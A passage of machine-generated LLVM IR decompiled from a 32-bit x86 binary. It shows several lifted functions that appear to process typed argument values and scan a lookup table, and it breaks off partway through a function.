  store i32 0, i32* %v2_804c728, align 4
  %v0_804c72f = load i32, i32* @ebx, align 4
  %v1_804c72f = add i32 %v0_804c72f, 8
  %v2_804c72f = inttoptr i32 %v1_804c72f to i32*
  store i32 0, i32* %v2_804c72f, align 4
  %v0_804c736 = load i32, i32* @ebx, align 4
  %v1_804c737 = call i32 @function_804c748(i32 %v0_804c736)
  %v1_804c73f = load i32, i32* @ebx, align 4
  %v2_804c73f = add i32 %v1_804c73f, 24
  %v3_804c73f = inttoptr i32 %v2_804c73f to i32*
  store i32 %v3_804c711, i32* %v3_804c73f, align 4
  br label %dec_label_pc_804c742

dec_label_pc_804c742:                             ; preds = %dec_label_pc_804c704, %dec_label_pc_804c71b
  %v2_804c742 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804c705, i32* @ebx, align 4
  store i32 %v0_804c704, i32* @esi, align 4
  ret i32 %v2_804c742

; uselistorder directives
  uselistorder i32 %v3_804c711, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_804c748, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c742, { 1, 0 }
}

define i32 @function_804c748(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c748:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c749 = load i32, i32* @ebx, align 4
  store i32 %v0_804c749, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804c74e = add i32 %arg1, 24
  %v2_804c74e = inttoptr i32 %v1_804c74e to i32*
  %v3_804c74e = load i32, i32* %v2_804c74e, align 4
  %v4_804c74e = icmp eq i32 %v3_804c74e, 0
  %v1_804c752 = add i32 %arg1, 80
  store i32 %v1_804c752, i32* %ebx.global-to-local, align 4
  %v1_804c755 = icmp eq i1 %v4_804c74e, false
  %v1_804c80d = add i32 %arg1, 8
  %v2_804c80d = inttoptr i32 %v1_804c80d to i32*
  %v3_804c80d = load i32, i32* %v2_804c80d, align 4
  %v8_804c80d = icmp eq i32 %v3_804c80d, -2147483648
  %v1_804c814 = icmp eq i1 %v8_804c80d, false
  br i1 %v1_804c755, label %dec_label_pc_804c80d, label %dec_label_pc_804c75b

dec_label_pc_804c75b:                             ; preds = %dec_label_pc_804c748
  br i1 %v1_804c814, label %dec_label_pc_804c775, label %dec_label_pc_804c764

dec_label_pc_804c764:                             ; preds = %dec_label_pc_804c75b
  %v1_804c764 = add i32 %arg1, 76
  %v2_804c764 = inttoptr i32 %v1_804c764 to i32*
  %v3_804c764 = load i32, i32* %v2_804c764, align 4
  store i32 %v3_804c764, i32* %eax.global-to-local, align 4
  %v1_804c767 = add i32 %v3_804c764, 4
  store i32 %v1_804c767, i32* %edx.global-to-local, align 4
  store i32 %v1_804c767, i32* %v2_804c764, align 4
  %v0_804c76d = load i32, i32* %eax.global-to-local, align 4
  %v1_804c76d = inttoptr i32 %v0_804c76d to i32*
  %v2_804c76d = load i32, i32* %v1_804c76d, align 4
  store i32 %v2_804c76d, i32* %eax.global-to-local, align 4
  %v1_804c76f = load i32, i32* @ecx, align 4
  %v2_804c76f = add i32 %v1_804c76f, 80
  %v3_804c76f = inttoptr i32 %v2_804c76f to i32*
  store i32 %v2_804c76d, i32* %v3_804c76f, align 4
  %v0_804c772 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c772 = load i32, i32* @ecx, align 4
  %v2_804c772 = add i32 %v1_804c772, 8
  %v3_804c772 = inttoptr i32 %v2_804c772 to i32*
  store i32 %v0_804c772, i32* %v3_804c772, align 4
  %v0_804c775.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c775

dec_label_pc_804c775:                             ; preds = %dec_label_pc_804c75b, %dec_label_pc_804c764
  %v1_804c784 = phi i32 [ %arg1, %dec_label_pc_804c75b ], [ %v0_804c775.pre, %dec_label_pc_804c764 ]
  %v1_804c775 = add i32 %v1_804c784, 4
  %v2_804c775 = inttoptr i32 %v1_804c775 to i32*
  %v3_804c775 = load i32, i32* %v2_804c775, align 4
  %v8_804c775 = icmp eq i32 %v3_804c775, -2147483648
  %v1_804c77c = icmp eq i1 %v8_804c775, false
  br i1 %v1_804c77c, label %dec_label_pc_804c78f, label %dec_label_pc_804c77e

dec_label_pc_804c77e:                             ; preds = %dec_label_pc_804c775
  %v1_804c77e = add i32 %v1_804c784, 76
  %v2_804c77e = inttoptr i32 %v1_804c77e to i32*
  %v3_804c77e = load i32, i32* %v2_804c77e, align 4
  store i32 %v3_804c77e, i32* %eax.global-to-local, align 4
  %v1_804c781 = add i32 %v3_804c77e, 4
  store i32 %v1_804c781, i32* %edx.global-to-local, align 4
  store i32 %v1_804c781, i32* %v2_804c77e, align 4
  %v0_804c787 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c787 = inttoptr i32 %v0_804c787 to i32*
  %v2_804c787 = load i32, i32* %v1_804c787, align 4
  store i32 %v2_804c787, i32* %eax.global-to-local, align 4
  %v1_804c789 = load i32, i32* @ecx, align 4
  %v2_804c789 = add i32 %v1_804c789, 80
  %v3_804c789 = inttoptr i32 %v2_804c789 to i32*
  store i32 %v2_804c787, i32* %v3_804c789, align 4
  %v0_804c78c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c78c = load i32, i32* @ecx, align 4
  %v2_804c78c = add i32 %v1_804c78c, 4
  %v3_804c78c = inttoptr i32 %v2_804c78c to i32*
  store i32 %v0_804c78c, i32* %v3_804c78c, align 4
  %v1_804c80615.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c78f

dec_label_pc_804c78f:                             ; preds = %dec_label_pc_804c775, %dec_label_pc_804c77e
  %v1_804c80615 = phi i32 [ %v1_804c784, %dec_label_pc_804c775 ], [ %v1_804c80615.pre, %dec_label_pc_804c77e ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804c80616 = add i32 %v1_804c80615, 28
  %v3_804c80617 = inttoptr i32 %v2_804c80616 to i32*
  %v4_804c80618 = load i32, i32* %v3_804c80617, align 4
  %v5_804c80920 = icmp sgt i32 %v4_804c80618, 0
  br i1 %v5_804c80920, label %dec_label_pc_804c793, label %dec_label_pc_804c83b.loopexit

dec_label_pc_804c793:                             ; preds = %dec_label_pc_804c78f, %dec_label_pc_804c805
  %v1_804c80622 = phi i32 [ %v1_804c806, %dec_label_pc_804c805 ], [ %v1_804c80615, %dec_label_pc_804c78f ]
  %v1_804c79321 = phi i32 [ %v1_804c805, %dec_label_pc_804c805 ], [ 0, %dec_label_pc_804c78f ]
  %v2_804c793 = mul i32 %v1_804c79321, 4
  %v3_804c793 = add i32 %v2_804c793, 40
  %v4_804c793 = add i32 %v3_804c793, %v1_804c80622
  %v5_804c793 = inttoptr i32 %v4_804c793 to i32*
  %v6_804c793 = load i32, i32* %v5_804c793, align 4
  store i32 %v6_804c793, i32* %eax.global-to-local, align 4
  %v1_804c797 = add i32 %v6_804c793, -8
  %v9_804c797 = icmp eq i32 %v1_804c797, 0
  br i1 %v9_804c797, label %dec_label_pc_804c805, label %dec_label_pc_804c79c

dec_label_pc_804c79c:                             ; preds = %dec_label_pc_804c793
  %v10_804c797 = icmp slt i32 %v1_804c797, 0
  %v6_804c797 = sub i32 7, %v6_804c793
  %v7_804c797 = and i32 %v6_804c797, %v6_804c793
  %v8_804c797 = icmp slt i32 %v7_804c797, 0
  %v1_804c79c = add i32 %v1_804c80622, 76
  %v2_804c79c = inttoptr i32 %v1_804c79c to i32*
  %v3_804c79c = load i32, i32* %v2_804c79c, align 4
  store i32 %v3_804c79c, i32* %edx.global-to-local, align 4
  %v3_804c79f = icmp eq i1 %v10_804c797, %v8_804c797
  br i1 %v3_804c79f, label %dec_label_pc_804c7af, label %dec_label_pc_804c7a1

dec_label_pc_804c7a1:                             ; preds = %dec_label_pc_804c79c
  %tmp13 = icmp slt i32 %v6_804c793, 3
  %v9_804c7a8 = icmp eq i32 %v6_804c793, 7
  %v1_804c7ab = icmp eq i1 %v9_804c7a8, false
  %or.cond = or i1 %tmp13, %v1_804c7ab
  br i1 %or.cond, label %dec_label_pc_804c7f8, label %dec_label_pc_804c7da

dec_label_pc_804c7af:                             ; preds = %dec_label_pc_804c79c
  %tmp14 = icmp sgt i32 %v6_804c793, 1024
  br i1 %tmp14, label %dec_label_pc_804c7b8, label %dec_label_pc_804c7f8

dec_label_pc_804c7b8:                             ; preds = %dec_label_pc_804c7af
  %v6_804c7b8 = icmp eq i32 %v6_804c793, 2048
  br i1 %v6_804c7b8, label %dec_label_pc_804c7c8, label %dec_label_pc_804c7bf

dec_label_pc_804c7bf:                             ; preds = %dec_label_pc_804c7b8
  %v9_804c7bf = icmp eq i32 %v6_804c793, 2055
  %v1_804c7c4 = icmp eq i1 %v9_804c7bf, false
  br i1 %v1_804c7c4, label %dec_label_pc_804c7f8, label %dec_label_pc_804c7e9

dec_label_pc_804c7c8:                             ; preds = %dec_label_pc_804c7b8
  %v1_804c7c8 = add i32 %v3_804c79c, 8
  store i32 %v1_804c7c8, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7c8, i32* %v2_804c79c, align 4
  %v0_804c7ce = load i32, i32* %edx.global-to-local, align 4
  %v1_804c7ce = inttoptr i32 %v0_804c7ce to i32*
  %v2_804c7ce = load i32, i32* %v1_804c7ce, align 4
  store i32 %v2_804c7ce, i32* %eax.global-to-local, align 4
  %v1_804c7d0 = add i32 %v0_804c7ce, 4
  %v2_804c7d0 = inttoptr i32 %v1_804c7d0 to i32*
  %v3_804c7d0 = load i32, i32* %v2_804c7d0, align 4
  store i32 %v3_804c7d0, i32* %edx.global-to-local, align 4
  %v1_804c7d3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c7d3 = inttoptr i32 %v1_804c7d3 to i32*
  store i32 %v2_804c7ce, i32* %v2_804c7d3, align 4
  %v0_804c7d5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c7d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c7d5 = add i32 %v1_804c7d5, 4
  %v3_804c7d5 = inttoptr i32 %v2_804c7d5 to i32*
  store i32 %v0_804c7d5, i32* %v3_804c7d5, align 4
  br label %dec_label_pc_804c802

dec_label_pc_804c7da:                             ; preds = %dec_label_pc_804c7a1
  %v3_804c7da = load i32, i32* %v2_804c79c, align 4
  store i32 %v3_804c7da, i32* %edx.global-to-local, align 4
  %v1_804c7dd = add i32 %v3_804c7da, 8
  store i32 %v1_804c7dd, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7dd, i32* %v2_804c79c, align 4
  %v0_804c7e3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c7e3 = inttoptr i32 %v0_804c7e3 to double*
  %v2_804c7e3 = load double, double* %v1_804c7e3, align 4
  %v2_804c7e5 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804c7e5 = inttoptr i32 %v2_804c7e5 to double*
  store double %v2_804c7e3, double* %v4_804c7e5, align 4
  br label %dec_label_pc_804c802

dec_label_pc_804c7e9:                             ; preds = %dec_label_pc_804c7bf
  %v3_804c7e9 = load i32, i32* %v2_804c79c, align 4
  store i32 %v3_804c7e9, i32* %edx.global-to-local, align 4
  %v1_804c7ec = add i32 %v3_804c7e9, 12
  store i32 %v1_804c7ec, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7ec, i32* %v2_804c79c, align 4
  %v0_804c7f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c7f2 = inttoptr i32 %v0_804c7f2 to x86_fp80*
  %v2_804c7f2 = load x86_fp80, x86_fp80* %v1_804c7f2, align 4
  %v2_804c7f4 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c7f4 = inttoptr i32 %v2_804c7f4 to x86_fp80*
  store x86_fp80 %v2_804c7f2, x86_fp80* %v3_804c7f4, align 4
  br label %dec_label_pc_804c802

dec_label_pc_804c7f8:                             ; preds = %dec_label_pc_804c7a1, %dec_label_pc_804c7af, %dec_label_pc_804c7bf
  %v1_804c7f8 = add i32 %v3_804c79c, 4
  store i32 %v1_804c7f8, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7f8, i32* %v2_804c79c, align 4
  %v0_804c7fe = load i32, i32* %edx.global-to-local, align 4
  %v1_804c7fe = inttoptr i32 %v0_804c7fe to i32*
  %v2_804c7fe = load i32, i32* %v1_804c7fe, align 4
  store i32 %v2_804c7fe, i32* %eax.global-to-local, align 4
  %v1_804c800 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c800 = inttoptr i32 %v1_804c800 to i32*
  store i32 %v2_804c7fe, i32* %v2_804c800, align 4
  br label %dec_label_pc_804c802

dec_label_pc_804c802:                             ; preds = %dec_label_pc_804c7e9, %dec_label_pc_804c7da, %dec_label_pc_804c7c8, %dec_label_pc_804c7f8
  %v0_804c802 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c802 = add i32 %v0_804c802, 12
  store i32 %v1_804c802, i32* %ebx.global-to-local, align 4
  %v0_804c805.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804c806.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c805

dec_label_pc_804c805:                             ; preds = %dec_label_pc_804c793, %dec_label_pc_804c802
  %v1_804c806 = phi i32 [ %v1_804c80622, %dec_label_pc_804c793 ], [ %v1_804c806.pre, %dec_label_pc_804c802 ]
  %v0_804c805 = phi i32 [ %v1_804c79321, %dec_label_pc_804c793 ], [ %v0_804c805.pre, %dec_label_pc_804c802 ]
  %v1_804c805 = add i32 %v0_804c805, 1
  store i32 %v1_804c805, i32* %esi.global-to-local, align 4
  %v2_804c806 = add i32 %v1_804c806, 28
  %v3_804c806 = inttoptr i32 %v2_804c806 to i32*
  %v4_804c806 = load i32, i32* %v3_804c806, align 4
  %v5_804c809 = icmp slt i32 %v1_804c805, %v4_804c806
  br i1 %v5_804c809, label %dec_label_pc_804c793, label %dec_label_pc_804c806.dec_label_pc_804c83b.loopexit_crit_edge

dec_label_pc_804c80d:                             ; preds = %dec_label_pc_804c748
  br i1 %v1_804c814, label %dec_label_pc_804c824, label %dec_label_pc_804c816

dec_label_pc_804c816:                             ; preds = %dec_label_pc_804c80d
  %v1_804c816 = add i32 %arg1, 36
  %v2_804c816 = inttoptr i32 %v1_804c816 to i8*
  %v3_804c816 = load i8, i8* %v2_804c816, align 1
  %v2_804c81a = zext i8 %v3_804c816 to i32
  %v3_804c81a = mul nuw nsw i32 %v2_804c81a, 12
  store i32 %v3_804c81a, i32* %eax.global-to-local, align 4
  %v2_804c81d = add i32 %arg1, 68
  %v3_804c81d = add i32 %v2_804c81d, %v3_804c81a
  %v4_804c81d = inttoptr i32 %v3_804c81d to i32*
  %v5_804c81d = load i32, i32* %v4_804c81d, align 4
  store i32 %v5_804c81d, i32* %eax.global-to-local, align 4
  store i32 %v5_804c81d, i32* %v2_804c80d, align 4
  %v0_804c824.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c824

dec_label_pc_804c824:                             ; preds = %dec_label_pc_804c80d, %dec_label_pc_804c816
  %v1_804c838 = phi i32 [ %arg1, %dec_label_pc_804c80d ], [ %v0_804c824.pre, %dec_label_pc_804c816 ]
  %v1_804c824 = add i32 %v1_804c838, 4
  %v2_804c824 = inttoptr i32 %v1_804c824 to i32*
  %v3_804c824 = load i32, i32* %v2_804c824, align 4
  %v8_804c824 = icmp eq i32 %v3_804c824, -2147483648
  %v1_804c82b = icmp eq i1 %v8_804c824, false
  br i1 %v1_804c82b, label %dec_label_pc_804c83b, label %dec_label_pc_804c82d

dec_label_pc_804c82d:                             ; preds = %dec_label_pc_804c824
  %v1_804c82d = add i32 %v1_804c838, 37
  %v2_804c82d = inttoptr i32 %v1_804c82d to i8*
  %v3_804c82d = load i8, i8* %v2_804c82d, align 1
  %v2_804c831 = zext i8 %v3_804c82d to i32
  %v3_804c831 = mul nuw nsw i32 %v2_804c831, 12
  store i32 %v3_804c831, i32* %eax.global-to-local, align 4
  %v1_804c834 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c834 = add nsw i32 %v3_804c831, -12
  %v3_804c834 = add i32 %v2_804c834, %v1_804c834
  %v4_804c834 = inttoptr i32 %v3_804c834 to i32*
  %v5_804c834 = load i32, i32* %v4_804c834, align 4
  store i32 %v5_804c834, i32* %eax.global-to-local, align 4
  store i32 %v5_804c834, i32* %v2_804c824, align 4
  %v0_804c83b.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c83b

dec_label_pc_804c806.dec_label_pc_804c83b.loopexit_crit_edge: ; preds = %dec_label_pc_804c805
  br label %dec_label_pc_804c83b.loopexit

dec_label_pc_804c83b.loopexit:                    ; preds = %dec_label_pc_804c806.dec_label_pc_804c83b.loopexit_crit_edge, %dec_label_pc_804c78f
  %v1_804c806.lcssa = phi i32 [ %v1_804c806, %dec_label_pc_804c806.dec_label_pc_804c83b.loopexit_crit_edge ], [ %v1_804c80615, %dec_label_pc_804c78f ]
  br label %dec_label_pc_804c83b

dec_label_pc_804c83b:                             ; preds = %dec_label_pc_804c83b.loopexit, %dec_label_pc_804c824, %dec_label_pc_804c82d
  %v10_804c842 = phi i32 [ %v1_804c806.lcssa, %dec_label_pc_804c83b.loopexit ], [ %v1_804c838, %dec_label_pc_804c824 ], [ %v0_804c83b.pre, %dec_label_pc_804c82d ]
  %v1_804c83b = add i32 %v10_804c842, 8
  %v2_804c83b = inttoptr i32 %v1_804c83b to i32*
  %v3_804c83b = load i32, i32* %v2_804c83b, align 4
  store i32 %v3_804c83b, i32* %eax.global-to-local, align 4
  %v2_804c83e = icmp slt i32 %v3_804c83b, 0
  %v1_804c840 = icmp eq i1 %v2_804c83e, false
  br i1 %v1_804c840, label %dec_label_pc_804c856, label %dec_label_pc_804c842

dec_label_pc_804c842:                             ; preds = %dec_label_pc_804c83b
  %v1_804c842 = add i32 %v10_804c842, 16
  %v2_804c842 = inttoptr i32 %v1_804c842 to i32*
  %v3_804c842 = load i32, i32* %v2_804c842, align 4
  %v4_804c842 = or i32 %v3_804c842, 8
  store i32 %v4_804c842, i32* %v2_804c842, align 4
  %v0_804c846 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c846 = sub i32 0, %v0_804c846
  store i32 %v1_804c846, i32* %eax.global-to-local, align 4
  %v1_804c848 = load i32, i32* @ecx, align 4
  %v2_804c848 = add i32 %v1_804c848, 8
  %v3_804c848 = inttoptr i32 %v2_804c848 to i32*
  store i32 %v1_804c846, i32* %v3_804c848, align 4
  %v0_804c84b = load i32, i32* @ecx, align 4
  %v1_804c84b = add i32 %v0_804c84b, 16
  %v2_804c84b = inttoptr i32 %v1_804c84b to i32*
  %v3_804c84b = load i32, i32* %v2_804c84b, align 4
  %v4_804c84b = and i32 %v3_804c84b, -2
  store i32 %v4_804c84b, i32* %v2_804c84b, align 4
  %v0_804c84f = load i32, i32* @ecx, align 4
  %v1_804c84f = add i32 %v0_804c84f, 20
  %v2_804c84f = inttoptr i32 %v1_804c84f to i32*
  store i32 32, i32* %v2_804c84f, align 4
  %v0_804c858.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c856

dec_label_pc_804c856:                             ; preds = %dec_label_pc_804c83b, %dec_label_pc_804c842
  %v0_804c858 = phi i32 [ %v3_804c83b, %dec_label_pc_804c83b ], [ %v0_804c858.pre, %dec_label_pc_804c842 ]
  %v2_804c856 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c856, i32* @ebx, align 4
  ret i32 %v0_804c858

; uselistorder directives
  uselistorder i32 %v3_804c831, { 1, 0 }
  uselistorder i32 %v3_804c81a, { 1, 0 }
  uselistorder i32 %v1_804c805, { 2, 1, 0 }
  uselistorder i32 %v1_804c806, { 1, 2, 0 }
  uselistorder i32 %v3_804c79c, { 1, 0, 2 }
  uselistorder i32* %v2_804c79c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804c797, { 1, 0 }
  uselistorder i32 %v6_804c793, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804c79321, { 1, 0 }
  uselistorder i32 %v1_804c80615, { 2, 0, 1 }
  uselistorder i1 %v1_804c814, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804c856, { 1, 0 }
  uselistorder label %dec_label_pc_804c83b, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c824, { 1, 0 }
  uselistorder label %dec_label_pc_804c805, { 1, 0 }
  uselistorder label %dec_label_pc_804c802, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c7f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c793, { 1, 0 }
  uselistorder label %dec_label_pc_804c78f, { 1, 0 }
  uselistorder label %dec_label_pc_804c775, { 1, 0 }
}

define i32 @function_804c85c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c85c:
  %v0_804c85c = load i32, i32* @eax, align 4
  br label %dec_label_pc_804c863

dec_label_pc_804c863:                             ; preds = %dec_label_pc_804c863, %dec_label_pc_804c85c
  %v0_804c863 = phi i32 [ ptrtoint (i8** @global_var_8053476.122 to i32), %dec_label_pc_804c85c ], [ %v1_804c863, %dec_label_pc_804c863 ]
  %v1_804c863 = add i32 %v0_804c863, -2
  %v1_804c866 = inttoptr i32 %v1_804c863 to i16*
  %v2_804c866 = load i16, i16* %v1_804c866, align 2
  %v3_804c866 = sext i16 %v2_804c866 to i32
  %v12_804c869 = icmp ne i32 %v3_804c866, %v0_804c85c
  %v6_804c873 = icmp ugt i32 %v1_804c863, ptrtoint (i32* @global_var_805345e.123 to i32)
  %or.cond = and i1 %v6_804c873, %v12_804c869
  br i1 %or.cond, label %dec_label_pc_804c863, label %dec_label_pc_804c875

dec_label_pc_804c875:                             ; preds = %dec_label_pc_804c863
  %.pre = add i32 %v0_804c863, -134558816
  %v2_804c87b = sdiv i32 %.pre, 2
  store i32 %v2_804c87b, i32* @edx, align 4
  %v1_804c87d = add i32 %v2_804c87b, ptrtoint (i8** @global_var_8053476.122 to i32)
  %v2_804c87d = inttoptr i32 %v1_804c87d to i8*
  %v3_804c87d = load i8, i8* %v2_804c87d, align 1
  %v4_804c87d = zext i8 %v3_804c87d to i32
  ret i32 %v4_804c87d

; uselistorder directives
  uselistorder i32 %v2_804c87b, { 1, 0 }
  uselistorder i32 %v1_804c863, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8053476.122 to i32), { 1, 0 }
}

define i32 @function_804c885(i32* %arg1) local_unnamed_addr {
dec_label_pc_804c885:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c886 = load i32, i32* @edi, align 4
  %v0_804c887 = load i32, i32* @esi, align 4
  %v0_804c888 = load i32, i32* @ebx, align 4
  store i32 %v0_804c888, i32* %stack_var_-16, align 4
  %v4_804c888 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804c8b4 = add i32 %tmp76, 24
  %v2_804c8b4 = inttoptr i32 %v1_804c8b4 to i32*
  %v3_804c8b4 = load i32, i32* %v2_804c8b4, align 4
  store i32 %v3_804c8b4, i32* %eax.global-to-local, align 4
  %v1_804c8bb = add i32 %tmp76, 16
  %v2_804c8bb = inttoptr i32 %v1_804c8bb to i32*
  %v3_804c8bb = load i32, i32* %v2_804c8bb, align 4
  %v1_804c8be = and i32 %v3_804c8bb, 128
  %v2_804c8be = icmp eq i32 %v1_804c8be, 0
  store i32 %v1_804c8be, i32* %edi.global-to-local, align 4
  %v1_804c8c4 = icmp eq i1 %v2_804c8be, false
  br i1 %v1_804c8c4, label %dec_label_pc_804c8d7, label %dec_label_pc_804c8c6

dec_label_pc_804c8c6:                             ; preds = %dec_label_pc_804c885
  %v2_804c8c6 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804c924.outer

dec_label_pc_804c8d1:                             ; preds = %dec_label_pc_804ca5f
  %v1_804c8d1 = add i32 %v0_804ca5f.pre.pre, 1
  store i32 %v1_804c8d1, i32* @esi, align 4
  br label %dec_label_pc_804ca6f

dec_label_pc_804c8d7:                             ; preds = %dec_label_pc_804c885
  %v15_804c889 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c8d9

dec_label_pc_804c8d9:                             ; preds = %dec_label_pc_804c901.dec_label_pc_804c8d9_crit_edge, %dec_label_pc_804c8d7
  %v2_804c8ea = phi i32 [ %v2_804c8ea.pre, %dec_label_pc_804c901.dec_label_pc_804c8d9_crit_edge ], [ %v15_804c889, %dec_label_pc_804c8d7 ]
  %v3_804c8ea = phi i32 [ %v1_804c901, %dec_label_pc_804c901.dec_label_pc_804c8d9_crit_edge ], [ 0, %dec_label_pc_804c8d7 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804c8dd = mul i32 %v3_804c8ea, 4
  store i32 %v1_804c8dd, i32* @ecx, align 4
  %v2_804c8e4 = load i32, i32* %arg1, align 4
  store i32 %v2_804c8e4, i32* @edx, align 4
  %v2_804c8e6 = add i32 %v1_804c8dd, -4
  %v3_804c8e6 = add i32 %v2_804c8e6, %v2_804c8e4
  %v4_804c8e6 = inttoptr i32 %v3_804c8e6 to i32*
  %v5_804c8e6 = load i32, i32* %v4_804c8e6, align 4
  store i32 %v5_804c8e6, i32* %eax.global-to-local, align 4
  %v1_804c8ea = trunc i32 %v5_804c8e6 to i8
  %v4_804c8ea = add i32 %v2_804c8ea, 36
  %v5_804c8ea = add i32 %v4_804c8ea, %v3_804c8ea
  %v6_804c8ea = inttoptr i32 %v5_804c8ea to i8*
  store i8 %v1_804c8ea, i8* %v6_804c8ea, align 1
  %v0_804c8ee = load i32, i32* %eax.global-to-local, align 4
  %v1_804c8ee = urem i32 %v0_804c8ee, 256
  %v2_804c8ee = load i32, i32* @ebx, align 4
  %v3_804c8ee = and i32 %v2_804c8ee, -256
  %v4_804c8ee = or i32 %v3_804c8ee, %v1_804c8ee
  store i32 %v4_804c8ee, i32* @ebx, align 4
  %v1_804c8f0 = mul i32 %v0_804c8ee, 16777216
  %v2_804c8f0 = sdiv i32 %v1_804c8f0, 16777216
  store i32 %v2_804c8f0, i32* %eax.global-to-local, align 4
  %v1_804c8f3 = load i32, i32* @edx, align 4
  %v2_804c8f3 = load i32, i32* @ecx, align 4
  %v3_804c8f3 = add i32 %v1_804c8f3, -4
  %v4_804c8f3 = add i32 %v3_804c8f3, %v2_804c8f3
  %v5_804c8f3 = inttoptr i32 %v4_804c8f3 to i32*
  %v6_804c8f3 = load i32, i32* %v5_804c8f3, align 4
  %v17_804c8f3 = icmp eq i32 %v2_804c8f0, %v6_804c8f3
  %v1_804c8f7 = icmp eq i1 %v17_804c8f3, false
  br i1 %v1_804c8f7, label %dec_label_pc_804cc49, label %dec_label_pc_804c8fd

dec_label_pc_804c8fd:                             ; preds = %dec_label_pc_804c8d9
  %v3_804c8fd = trunc i32 %v0_804c8ee to i8
  %v4_804c8fd = icmp eq i8 %v3_804c8fd, 0
  br i1 %v4_804c8fd, label %dec_label_pc_804c907, label %dec_label_pc_804c901

dec_label_pc_804c901:                             ; preds = %dec_label_pc_804c8fd
  %v0_804c901 = load i32, i32* %esi.global-to-local, align 4
  %v1_804c901 = add i32 %v0_804c901, 1
  store i32 %v1_804c901, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804c901, 32
  br i1 %tmp, label %dec_label_pc_804c901.dec_label_pc_804c8d9_crit_edge, label %dec_label_pc_804c907

dec_label_pc_804c901.dec_label_pc_804c8d9_crit_edge: ; preds = %dec_label_pc_804c901
  %v2_804c8ea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c8d9

dec_label_pc_804c907:                             ; preds = %dec_label_pc_804c901, %dec_label_pc_804c8fd
  %v2_804c90c = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804c924.outer

dec_label_pc_804c924.outer:                       ; preds = %dec_label_pc_804c907, %dec_label_pc_804c8c6, %dec_label_pc_804ca41
  %v0_804c930.ph94 = phi i32 [ %v1_804ca41, %dec_label_pc_804ca41 ], [ %v2_804c8c6, %dec_label_pc_804c8c6 ], [ %v2_804c90c, %dec_label_pc_804c907 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804ca41 ], [ %tmp66, %dec_label_pc_804c8c6 ], [ %tmp66, %dec_label_pc_804c907 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804c8ca, %dec_label_pc_804ca41 ], [ 0, %dec_label_pc_804c8c6 ], [ 0, %dec_label_pc_804c907 ]
